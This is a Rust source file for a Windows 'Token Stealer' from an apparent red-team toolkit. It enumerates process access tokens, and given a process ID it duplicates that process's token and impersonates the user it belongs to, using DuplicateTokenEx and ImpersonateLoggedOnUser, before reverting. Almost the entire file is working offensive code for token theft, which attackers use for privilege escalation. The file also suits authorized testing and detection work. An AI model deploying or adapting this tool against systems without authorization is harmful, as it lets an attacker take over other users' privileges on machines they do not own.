//! Token Stealer - Enumerate and impersonate access tokens
//!
//! Part of TurboNet Security Toolkit
//! For authorized security testing only

use std::env;

#[cfg(windows)]
mod token_ops {
    use std::ffi::c_void;
    use std::mem;
    use windows::Win32::Foundation::*;
    use windows::Win32::Security::*;
    use windows::Win32::System::Diagnostics::ToolHelp::*;
    use windows::Win32::System::Threading::*;

    pub fn list_tokens() {
        println!("[*] Enumerating process tokens...\n");
        println!(
            "{:<8} | {:<30} | {:<15} | {}",
            "PID", "Process", "User", "Integrity"
        );
        println!("{}", "-".repeat(80));

        unsafe {
            let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
                Ok(s) => s,
                Err(_) => return,
            };

            let mut entry = PROCESSENTRY32W {
                dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
                ..Default::default()
            };

            if Process32FirstW(snapshot, &mut entry).is_ok() {
                loop {
                    let name: String = entry
                        .szExeFile
                        .iter()
                        .take_while(|&&c| c != 0)
                        .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                        .collect();

                    // Try to get token info
                    if let Ok(handle) = OpenProcess(
                        PROCESS_QUERY_LIMITED_INFORMATION,
                        false,
                        entry.th32ProcessID,
                    ) {
                        let mut token = HANDLE::default();
                        if OpenProcessToken(handle, TOKEN_QUERY, &mut token).is_ok() {
                            let user = get_token_user(token).unwrap_or_else(|| "N/A".to_string());
                            let integrity =
                                get_token_integrity(token).unwrap_or_else(|| "N/A".to_string());

                            // Truncate long names
                            let name_display = if name.len() > 28 {
                                format!("{}…", &name[..27])
                            } else {
                                name.clone()
                            };

                            println!(
                                "{:<8} | {:<30} | {:<15} | {}",
                                entry.th32ProcessID, name_display, user, integrity
                            );

                            let _ = CloseHandle(token);
                        }
                        let _ = CloseHandle(handle);
                    }

                    if Process32NextW(snapshot, &mut entry).is_err() {
                        break;
                    }
                }
            }
            let _ = CloseHandle(snapshot);
        }
    }

    pub fn steal_token(pid: u32) {
        println!("[*] Attempting to impersonate token from PID {}...\n", pid);

        unsafe {
            // Open target process
            let handle = match OpenProcess(PROCESS_QUERY_INFORMATION, false, pid) {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("[!] Failed to open process: {:?}", e);
                    eprintln!("[!] Requires SeDebugPrivilege - run as Administrator");
                    return;
                }
            };

            // Get process token
            let mut token = HANDLE::default();
            if OpenProcessToken(handle, TOKEN_DUPLICATE | TOKEN_QUERY, &mut token).is_err() {
                eprintln!("[!] Failed to open process token");
                let _ = CloseHandle(handle);
                return;
            }

            // Display current token info
            println!("[*] Target token info:");
            if let Some(user) = get_token_user(token) {
                println!("    User: {}", user);
            }
            if let Some(integrity) = get_token_integrity(token) {
                println!("    Integrity: {}", integrity);
            }

            // Duplicate token
            let mut dup_token = HANDLE::default();
            if DuplicateTokenEx(
                token,
                TOKEN_ALL_ACCESS,
                None,
                SecurityImpersonation,
                TokenImpersonation,
                &mut dup_token,
            )
            .is_ok()
            {
                println!("\n[+] Token duplicated successfully!");

                // Impersonate
                if ImpersonateLoggedOnUser(dup_token).is_ok() {
                    println!("[+] Now impersonating target token");
                    println!("[*] Whoami check would show impersonated user");

                    // Revert
                    let _ = RevertToSelf();
                    println!("[*] Reverted to original token");
                } else {
                    eprintln!("[!] Impersonation failed");
                }

                let _ = CloseHandle(dup_token);
            } else {
                eprintln!("[!] Token duplication failed");
            }

            let _ = CloseHandle(token);
            let _ = CloseHandle(handle);
        }
    }

    fn get_token_user(token: HANDLE) -> Option<String> {
        unsafe {
            let mut size = 0u32;
            let _ = GetTokenInformation(token, TokenUser, None, 0, &mut size);

            if size == 0 {
                return None;
            }

            let mut buffer = vec![0u8; size as usize];
            if GetTokenInformation(
                token,
                TokenUser,
                Some(buffer.as_mut_ptr() as *mut c_void),
                size,
                &mut size,
            )
            .is_ok()
            {
                let token_user = &*(buffer.as_ptr() as *const TOKEN_USER);

                let mut name = [0u16; 256];
                let mut domain = [0u16; 256];
                let mut name_len = 256u32;
                let mut domain_len = 256u32;
                let mut sid_type = SID_NAME_USE::default();

                if LookupAccountSidW(
                    None,
                    token_user.User.Sid,
                    windows::core::PWSTR(name.as_mut_ptr()),
                    &mut name_len,
                    windows::core::PWSTR(domain.as_mut_ptr()),
                    &mut domain_len,
                    &mut sid_type,
                )
                .is_ok()
                {
                    let user: String = name[..name_len as usize]
                        .iter()
                        .take_while(|&&c| c != 0)
                        .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                        .collect();
                    return Some(user);
                }
            }
            None
        }
    }

    fn get_token_integrity(token: HANDLE) -> Option<String> {
        unsafe {
            let mut size = 0u32;
            let _ = GetTokenInformation(token, TokenIntegrityLevel, None, 0, &mut size);

            if size == 0 {
                return None;
            }

            let mut buffer = vec![0u8; size as usize];
            if GetTokenInformation(
                token,
                TokenIntegrityLevel,
                Some(buffer.as_mut_ptr() as *mut c_void),
                size,
                &mut size,
            )
            .is_ok()
            {
                let label = &*(buffer.as_ptr() as *const TOKEN_MANDATORY_LABEL);
                let sid = label.Label.Sid;

                let sub_auth_count = *GetSidSubAuthorityCount(sid);
                if sub_auth_count > 0 {
                    let rid = *GetSidSubAuthority(sid, sub_auth_count as u32 - 1);

                    let level = match rid {
                        0x0000 => "Untrusted",
                        0x1000 => "Low",
                        0x2000 => "Medium",
                        0x2100 => "Medium+",
                        0x3000 => "High",
                        0x4000 => "System",
                        _ => "Unknown",
                    };
                    return Some(level.to_string());
                }
            }
            None
        }
    }
}

fn print_banner() {
    println!(
        r#"
╔═══════════════════════════════════════════════════════════════╗
║  ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗                 ║
║  ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║                 ║
║     ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║                 ║
║     ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║                 ║
║     ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║                 ║
║     ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝                 ║
║            STEALER - Access Token Tool v0.1                    ║
╚═══════════════════════════════════════════════════════════════╝
"#
    );
    println!("⚠  FOR AUTHORIZED SECURITY TESTING ONLY\n");
}

fn print_usage(prog: &str) {
    println!("Usage:");
    println!("  {} --list              List process tokens", prog);
    println!("  {} --steal <PID>       Impersonate process token", prog);
    println!();
    println!("Requires: Administrator + SeDebugPrivilege");
}

fn main() {
    print_banner();

    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        print_usage(&args[0]);
        return;
    }

    #[cfg(windows)]
    match args[1].as_str() {
        "--list" | "-l" => token_ops::list_tokens(),
        "--steal" | "-s" => {
            if args.len() > 2 {
                if let Ok(pid) = args[2].parse::<u32>() {
                    token_ops::steal_token(pid);
                }
            }
        }
        "--help" | "-h" => print_usage(&args[0]),
        _ => print_usage(&args[0]),
    }

    #[cfg(not(windows))]
    eprintln!("[!] Token Stealer is Windows-only");
}
